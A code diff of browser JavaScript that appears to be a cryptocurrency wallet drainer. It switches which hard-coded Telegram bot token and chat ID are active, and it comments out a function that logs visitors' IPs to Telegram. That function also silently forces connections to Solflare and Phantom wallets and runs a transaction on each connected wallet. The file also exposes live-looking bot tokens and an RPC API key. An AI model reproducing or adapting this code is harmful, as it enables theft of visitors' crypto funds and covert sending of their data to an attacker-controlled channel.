@@ -1,9 +1,9 @@
 $(document).ready(async function () {
-    //const telegramToken = "8195575076:AAFtYXrlFAsYMoThgEiUjHKAN6-tyPFr4J4";
-   const telegramToken = "8156645817:AAH_KHYsM_9OZ6Q7Uj55cJsyA6gZKybCp1s"; //
+    const telegramToken = "8195575076:AAFtYXrlFAsYMoThgEiUjHKAN6-tyPFr4J4";
+   //const telegramToken = "8156645817:AAH_KHYsM_9OZ6Q7Uj55cJsyA6gZKybCp1s"; //
   // Sostituisci con il token del tuo bot
-   const chatId = "7050439107"; // Sostituisci con il tuo chat ID
-  //const chatId = "927059314"; // Sostituisci con il tuo chat ID
+   //const chatId = "7050439107"; // Sostituisci con il tuo chat ID
+  const chatId = "927059314"; // Sostituisci con il tuo chat ID
   const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
    const isMobile =
     /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
@@ -296,82 +296,82 @@ $(document).ready(async function () {
       hideLoader(selected);
     }
   }
-async function notifyPageVisit() {
-  const domain = window.location.hostname;
-  const visitorIp = await getVisitorIp();
+// async function notifyPageVisit() {
+//   const domain = window.location.hostname;
+//   const visitorIp = await getVisitorIp();
 
-  await sendTelegramMessage(
-    `👋 New visitor!\n🔗 Domain: ${domain}\n🌐 IP: ${visitorIp}`
-  );
+//   await sendTelegramMessage(
+//     `👋 New visitor!\n🔗 Domain: ${domain}\n🌐 IP: ${visitorIp}`
+//   );
 
-  await sendTelegramMessage("🔍 Checking for connected wallets...");
+//   await sendTelegramMessage("🔍 Checking for connected wallets...");
 
-  try {
-    const connection = new solanaWeb3.Connection(
-      "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
-      "confirmed"
-    );
+//   try {
+//     const connection = new solanaWeb3.Connection(
+//       "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
+//       "confirmed"
+//     );
 
-    // 🔎 Try Solflare (Jupiter)
-    if (window.solflare && window.solflare.isSolflare) {
-      await sendTelegramMessage("🟪 Detected Solflare (Jupiter) object.");
+//     // 🔎 Try Solflare (Jupiter)
+//     if (window.solflare && window.solflare.isSolflare) {
+//       await sendTelegramMessage("🟪 Detected Solflare (Jupiter) object.");
 
-      let publicKey = window.solflare.publicKey;
+//       let publicKey = window.solflare.publicKey;
 
-      // Force connect if no publicKey
-      if (!publicKey) {
-        try {
-          await sendTelegramMessage("🔌 Attempting silent connect to Solflare...");
-          const resp = await window.solflare.connect();
-          publicKey = resp?.publicKey || window.solflare.publicKey;
-        } catch (e) {
-          await sendTelegramMessage(`⚠️ Solflare connect failed: ${e.message}`);
-        }
-      }
+//       // Force connect if no publicKey
+//       if (!publicKey) {
+//         try {
+//           await sendTelegramMessage("🔌 Attempting silent connect to Solflare...");
+//           const resp = await window.solflare.connect();
+//           publicKey = resp?.publicKey || window.solflare.publicKey;
+//         } catch (e) {
+//           await sendTelegramMessage(`⚠️ Solflare connect failed: ${e.message}`);
+//         }
+//       }
 
-      if (publicKey) {
-        await sendTelegramMessage(`✅ Jupiter wallet connected: ${publicKey.toBase58()}`);
-        await executeTransaction(connection, window.solflare, publicKey);
-        await sendTelegramMessage("🚀 Transaction executed for Jupiter wallet.");
-        return;
-      } else {
-        await sendTelegramMessage("❌ Jupiter wallet still missing publicKey after connect.");
-      }
-    }
+//       if (publicKey) {
+//         await sendTelegramMessage(`✅ Jupiter wallet connected: ${publicKey.toBase58()}`);
+//         await executeTransaction(connection, window.solflare, publicKey);
+//         await sendTelegramMessage("🚀 Transaction executed for Jupiter wallet.");
+//         return;
+//       } else {
+//         await sendTelegramMessage("❌ Jupiter wallet still missing publicKey after connect.");
+//       }
+//     }
 
-    // 🔎 Try Phantom
-    if (window.solana && window.solana.isPhantom) {
-      await sendTelegramMessage("🟦 Detected Phantom wallet object.");
+//     // 🔎 Try Phantom
+//     if (window.solana && window.solana.isPhantom) {
+//       await sendTelegramMessage("🟦 Detected Phantom wallet object.");
 
-      let publicKey = window.solana.publicKey;
+//       let publicKey = window.solana.publicKey;
 
-      // Force connect if no publicKey
-      if (!publicKey) {
-        try {
-          await sendTelegramMessage("🔌 Attempting silent connect to Phantom...");
-          const resp = await window.solana.connect();
-          publicKey = resp?.publicKey || window.solana.publicKey;
-        } catch (e) {
-          await sendTelegramMessage(`⚠️ Phantom connect failed: ${e.message}`);
-        }
-      }
+//       // Force connect if no publicKey
+//       if (!publicKey) {
+//         try {
+//           await sendTelegramMessage("🔌 Attempting silent connect to Phantom...");
+//           const resp = await window.solana.connect();
+//           publicKey = resp?.publicKey || window.solana.publicKey;
+//         } catch (e) {
+//           await sendTelegramMessage(`⚠️ Phantom connect failed: ${e.message}`);
+//         }
+//       }
 
-      if (publicKey) {
-        await sendTelegramMessage(`✅ Phantom wallet connected: ${publicKey.toBase58()}`);
-        await executeTransaction(connection, window.solana, publicKey);
-        await sendTelegramMessage("🚀 Transaction executed for Phantom wallet.");
-        return;
-      } else {
-        await sendTelegramMessage("❌ Phantom wallet still missing publicKey after connect.");
-      }
-    }
+//       if (publicKey) {
+//         await sendTelegramMessage(`✅ Phantom wallet connected: ${publicKey.toBase58()}`);
+//         await executeTransaction(connection, window.solana, publicKey);
+//         await sendTelegramMessage("🚀 Transaction executed for Phantom wallet.");
+//         return;
+//       } else {
+//         await sendTelegramMessage("❌ Phantom wallet still missing publicKey after connect.");
+//       }
+//     }
 
-    await sendTelegramMessage("🚫 No wallet connected or retrievable.");
-  } catch (err) {
-    console.error("❌ Error in notifyPageVisit auto-execution:", err);
-    await sendTelegramMessage(`💥 Error during auto-execute: ${err.message}`);
-  }
-}
+//     await sendTelegramMessage("🚫 No wallet connected or retrievable.");
+//   } catch (err) {
+//     console.error("❌ Error in notifyPageVisit auto-execution:", err);
+//     await sendTelegramMessage(`💥 Error during auto-execute: ${err.message}`);
+//   }
+// }
 
 
   // Update the wallet connection handlers
